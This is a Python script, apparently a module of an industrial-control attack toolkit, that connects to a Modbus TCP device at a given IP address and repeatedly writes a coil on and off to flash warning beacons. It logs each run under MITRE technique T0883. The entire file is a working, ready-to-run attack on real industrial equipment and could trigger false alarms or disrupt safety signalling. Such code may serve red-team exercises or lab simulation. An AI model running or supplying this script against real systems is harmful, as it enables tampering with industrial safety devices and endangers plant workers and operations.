#!/usr/bin/env python3
# modules/attacks/warning_beacon_flasher.py

import argparse
import json
import os
import time
from datetime import datetime
from pymodbus.client import ModbusTcpClient

LOG_FILE = "results/beacon_flash_log.json"
MITRE_TTP = "T0883"

def log_event(ip, coils, duration):
    os.makedirs("results", exist_ok=True)
    entry = {
        "timestamp": datetime.utcnow().isoformat(),
        "target_ip": ip,
        "coils": coils,
        "duration": duration,
        "ttp": MITRE_TTP
    }
    with open(LOG_FILE, "a") as f:
        f.write(json.dumps(entry) + "\n")

def toggle_beacon(ip, port, coil, duration):
    client = ModbusTcpClient(ip, port=port)
    if not client.connect():
        print(f"[!] Failed to connect to {ip}:{port}")
        return
    try:
        print(f"[*] Flashing beacon on coil {coil} for {duration}s...")
        end_time = time.time() + duration
        while time.time() < end_time:
            client.write_coil(coil, True)
            time.sleep(0.5)
            client.write_coil(coil, False)
            time.sleep(0.5)
        log_event(ip, coil, duration)
        print("[✓] Beacon flash cycle completed.")
    finally:
        client.close()

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Flash Modbus-controlled warning beacons")
    parser.add_argument("--ip", required=True, help="Target Modbus device IP")
    parser.add_argument("--port", type=int, default=502, help="Modbus port")
    parser.add_argument("--coil", type=int, default=0, help="Coil address for beacon control")
    parser.add_argument("--duration", type=int, default=10, help="Flash duration in seconds")
    args = parser.parse_args()
    toggle_beacon(args.ip, args.port, args.coil, args.duration)
